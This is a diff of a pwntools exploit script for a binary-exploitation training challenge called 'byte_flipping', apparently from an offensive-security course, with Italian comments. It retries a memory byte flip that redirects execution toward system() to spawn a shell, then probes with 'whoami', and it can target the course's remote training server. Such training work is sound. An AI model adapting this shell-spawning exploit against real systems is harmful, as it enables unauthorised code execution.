@@ -17,9 +17,14 @@ def genbin(binary_name):
 context.terminal = ['tmux', 'splitw', '-h']
 context.log_level = "error"
 
-for i in range(30):
-    r = process("./byte_flipping")
-    #r = remote("bin.training.offdef.it", 4003)
+
+while True:
+    if args["REMOTE"]:
+        r = remote("bin.training.offdef.it", 4003)
+    else:
+        r = process("./byte_flipping")
+    
+
     time.sleep(0.5)
     r.sendline(b"giulio")       #primo loop
     time.sleep(0.2)
@@ -61,13 +66,23 @@ for i in range(30):
     time.sleep(0.2)             # l'istruzione 0x4008e9 è prima della memcpy ed è LEA RDI, [name] (perfetta per system)
     r.sendline(b"0x0060203a")
     time.sleep(0.2)
-    r.sendline(b"0x05")
+    r.sendline(b"0xc5")
     time.sleep(0.2)
     r.sendline(b"e")
     time.sleep(0.2)
     r.sendline(b"0x100")        # riavvio di nuovo
     time.sleep(0.2)
     
-    r.sendline(b"/bin/sh\x00")  # quarto main, questo valore potrebbe essere qualsiasi cosa, non verrà memorizzato
+    r.send(b"\x00" * 0x20)  # quarto main, questo valore potrebbe essere qualsiasi cosa, non verrà memorizzato
     time.sleep(0.2)
-    r.interactive()             # intorno all'ottavo tentativo si dovrebbe ottenere una shell
+    
+    try:
+        r.recvrepeat(timeout=1)
+        r.sendline(b"whoami")
+        print(r.recvall(timeout=0.2), end="")
+    except:
+        print(r.recvall(timeout=0.2))
+        r.close()
+    finally:
+        print(r.recvall(timeout=0.2))
+        r.close()
